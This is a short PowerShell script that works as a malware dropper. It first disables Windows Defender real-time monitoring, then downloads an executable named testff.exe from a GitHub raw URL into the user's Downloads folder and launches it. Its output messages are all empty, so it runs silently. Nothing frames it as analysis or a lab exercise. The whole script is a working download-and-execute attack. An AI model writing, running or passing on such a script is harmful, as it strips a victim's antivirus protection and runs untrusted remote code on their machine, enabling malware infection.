Set-MpPreference -DisableRealtimeMonitoring $true

$url = "https://github.com/ExoTiiCk/Nouveau-dossier-2-/raw/refs/heads/main/testff.exe"

$userProfile = [System.Environment]::GetFolderPath("UserProfile")

$localPath = "$userProfile\Downloads\testff.exe"

function Show-FileLocation {
    param (
        [string]$filePath
    )
    Write-Output ""
}

Write-Output ""

if (-Not (Test-Path -Path "$userProfile\Downloads")) {
    New-Item -ItemType Directory -Path "$userProfile\Downloads"
    Write-Output ""
}

try {
    Invoke-WebRequest -Uri $url -OutFile $localPath
    Write-Output ""
    Show-FileLocation -filePath $localPath
} catch {
    Write-Output ""
}

if (Test-Path $localPath) {
    Write-Output ""

    try {
        Start-Process -FilePath $localPath
        Write-Output ""
    } catch {
        Write-Output ""
    }
} else {
    Write-Output ""
}

Write-Output ""
exit
